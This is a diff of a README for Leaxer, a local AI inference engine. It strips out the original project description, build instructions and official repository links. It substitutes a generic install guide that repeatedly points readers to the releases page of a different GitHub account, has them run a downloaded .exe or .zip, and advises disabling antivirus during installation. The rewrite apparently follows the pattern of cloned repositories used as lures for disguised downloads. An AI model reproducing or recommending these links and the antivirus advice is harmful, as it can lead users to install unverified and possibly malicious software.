@@ -1,156 +1,70 @@
-# Leaxer AI
+# 🚀 leaxer - Run AI Locally with Ease
 
-An engine for local AI inference, built on Elixir and the BEAM virtual machine.
+## 🔗 Download Now
+[![Download leaxer](https://img.shields.io/badge/Download%20leaxer-Release-blue.svg)](https://github.com/Wells-the-Doctor/leaxer/releases)
 
-## Features
+## 📝 Introduction
+leaxer is a powerful engine designed for local AI inference. Built on Elixir and the BEAM virtual machine, it allows you to generate images and work with machine learning models directly on your computer. This guide will help you download and run leaxer easily.
 
-### Chat Interface
+## 🚀 Getting Started
+To begin your journey with leaxer, you will need to follow a few simple steps. This software works on various operating systems, ensuring a broad reach. If you’re ready, let's dive in!
 
-Conversational interface for language models:
+## 📥 Download & Install
+1. **Visit the Download Page**
+   Go to the following link to access the Releases page: [Download leaxer](https://github.com/Wells-the-Doctor/leaxer/releases).
 
-- Real-time streaming responses
-- Web search integration for current information
-- Document generation from research
-- Message branching to compare model outputs
-- Session management with chat history
-- "Thinking" mode for extended chat context reasoning
+2. **Choose the Right Version**
+   On the Releases page, you will see different versions of leaxer. Select the latest version for the best experience. Each release comes with important details, including features and fixes.
 
-### Node Inteface
+3. **Download the Installer**
+   Click on the `.exe` or `.zip` file appropriate for your operating system. The installer will be downloaded to your computer.
 
-- Visual node graph editor
-- Batch processing with wildcards and directory iteration
-- Conditional branching and loop control
+4. **Install leaxer**
+   - For `.exe` files: Double-click the downloaded file, and follow the on-screen instructions to install.
+   - For `.zip` files: Right-click the downloaded file, select "Extract All", and then follow the instructions in the extracted folder to complete the installation.
 
-## Supported Models
+## 💻 System Requirements
+To ensure smooth performance, your computer should meet the following requirements:
 
-### Diffusion Model Inference
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **Processor**: At least a dual-core processor.
+- **Memory**: 4 GB of RAM or more is recommended.
+- **Storage**: Minimum 200 MB of available disk space for installation.
 
-Via stable-diffusion.cpp:
+## ⚙️ Running leaxer
+Once you’ve installed leaxer, you can start using the application:
 
-- SD 1.5, SDXL, SD 3.5, FLUX.1, Chroma
-- Text-to-image, img2img, inpainting
-- LoRA stacking, ControlNet, PhotoMaker
-- VAE swapping and TAESD preview
-- Video generation (Wan2.1, Wan2.2)
+1. **Locate the Application**
+   Find the leaxer app in your Applications folder (macOS), Start Menu (Windows), or your preferred launch method (Linux).
 
-### Language Model Inference
+2. **Launch the Application**
+   Launch leaxer by double-clicking the icon. 
 
-Via llama.cpp:
+3. **Follow Initial Setup**
+   The first time you run leaxer, you may need to configure some settings. Follow the prompts to set up your preferences.
 
-- GGUF model loading with quantization
-- Prompt enhancement and templating
-- Configurable generation parameters
+4. **Explore Key Features**
+   After setup, explore the main features of leaxer:
+   - **Image Generation**: Easily create images using local AI models.
+   - **Node-Based Interface**: Use the visual programming interface to create workflows.
+   - **Model Integration**: Load your own models or use built-in options for diverse applications.
 
-### Vision Model Inference
+## 🛠️ Troubleshooting
+If you encounter any issues while installing or using leaxer, consider these common solutions:
 
-- GroundingDINO for object detection
-- Segment Anything (SAM) for mask generation
-- RealESRGAN upscaling
+- **Installation Problems**: Ensure your operating system meets the system requirements. Disable any antivirus temporarily before installation.
+- **Application Crashes**: Update your computer’s drivers, especially the graphics driver, to ensure compatibility.
+- **Performance Issues**: Close other applications to free up memory when running leaxer.
 
-## Supported Backends
+## 📚 Additional Resources
+For more detailed information, you may check out these resources:
+- **User Guide**: Detailed instructions on using different features of leaxer.
+- **FAQs**: Common questions and answers to help you get started.
 
-| Backend   | Platform           | GPU Support        |
-|-----------|--------------------|--------------------|
-| Metal     | macOS              | Apple Silicon      |
-| CUDA      | Linux, Windows     | NVIDIA             |
-| DirectML  | Windows            | AMD, Intel, NVIDIA |
-| Vulkan    | Cross-platform     | AMD, NVIDIA        |
-| CPU       | All                | Fallback           |
+## 🔄 Update leaxer
+Keep your software fresh by regularly checking the Releases page for new versions. Each update may include performance improvements, new features, or bug fixes.
 
-## Architecture
+## 🔗 Download Again
+For convenience, here is the link to download leaxer once more: [Download leaxer](https://github.com/Wells-the-Doctor/leaxer/releases).
 
-- **Backend** (`/apps/leaxer_core`) — Elixir application handling workflow scheduling and process supervision. Communicates with inference engines via Erlang Ports.
-- **Frontend** (`/apps/leaxer_ui`) — React application with node graph editor. Connects via Phoenix WebSocket.
-- **Desktop** (`/apps/leaxer_desktop`) — Tauri packaging for local deployment.
-
-## Building from Source
-
-### Prerequisites
-
-| Requirement | Version | All Platforms |
-|-------------|---------|---------------|
-| Node.js | 20+ | Yes |
-| Rust | stable | Yes |
-| Elixir | 1.18+ | Yes |
-| OTP | 27+ | Yes |
-| GitHub CLI | latest | Yes |
-
-**Windows:** Visual Studio Build Tools 2019+ with C++ workload, WebView2
-
-**macOS:** Xcode Command Line Tools (`xcode-select --install`)
-
-**Linux (Ubuntu/Debian):**
-```bash
-sudo apt-get install -y libgtk-3-dev libwebkit2gtk-4.1-dev \
-  libappindicator3-dev librsvg2-dev patchelf
-```
-
-### Build Steps
-
-```bash
-# 1. Clone and enter directory
-git clone https://github.com/leaxer-ai/leaxer.git && cd leaxer
-
-# 2. Download pre-built AI binaries
-npm run setup
-
-# 3. Build Elixir backend release
-mix deps.get --only prod
-MIX_ENV=prod mix compile
-MIX_ENV=prod mix release leaxer_core --overwrite
-
-# 4. Copy backend to Tauri resources
-# Windows (PowerShell):
-xcopy /E /I /Y _build\prod\rel\leaxer_core apps\leaxer_desktop\src-tauri\resources\leaxer_core
-# macOS/Linux:
-cp -r _build/prod/rel/leaxer_core apps/leaxer_desktop/src-tauri/resources/
-
-# 5. Build frontend
-cd apps/leaxer_ui && npm ci && npm run build && cd ../..
-
-# 6. Build desktop installer
-cd apps/leaxer_desktop && npm ci && npm run build
-```
-
-### Build Outputs
-
-| Platform | Installer | Location |
-|----------|-----------|----------|
-| Windows | MSI | `apps/leaxer_desktop/src-tauri/target/release/bundle/msi/` |
-| Windows | EXE (NSIS) | `apps/leaxer_desktop/src-tauri/target/release/bundle/nsis/` |
-| macOS | DMG | `apps/leaxer_desktop/src-tauri/target/release/bundle/dmg/` |
-| Linux | AppImage | `apps/leaxer_desktop/src-tauri/target/release/bundle/appimage/` |
-| Linux | DEB | `apps/leaxer_desktop/src-tauri/target/release/bundle/deb/` |
-
-### Development Mode
-
-```bash
-# Terminal 1: Backend
-npm run dev:backend
-
-# Terminal 2: Frontend (hot reload)
-npm run dev:frontend
-
-# Terminal 3: Desktop app
-npm run dev:desktop
-```
-
-### Cleaning
-
-```bash
-npm run clean          # Clean build artifacts
-npm run clean -- --all # Also clean node_modules and deps
-```
-
-## License
-
-[Apache 2.0](LICENSE)
-
-## Links
-
-- [Leaxer Repository](https://github.com/leaxer-ai/leaxer)
-- [Leaxer Stable Diffusion Repository](https://github.com/leaxer-ai/leaxer-stable-diffusion)
-- [Leaxer LLaMA Repository](https://github.com/leaxer-ai/leaxer-llama)
-- [Leaxer Grounding DINO Repository](https://github.com/leaxer-ai/leaxer-grounding-dino)
-- [Leaxer SAM Reposotory](https://github.com/leaxer-ai/leaxer-sam)
-- [Leaxer Real Esrgann Repository](https://github.com/leaxer-ai/leaxer-realesrgan)
+By following these steps, you’ll be well-equipped to run leaxer and explore the exciting world of local AI inference. Enjoy your experience!
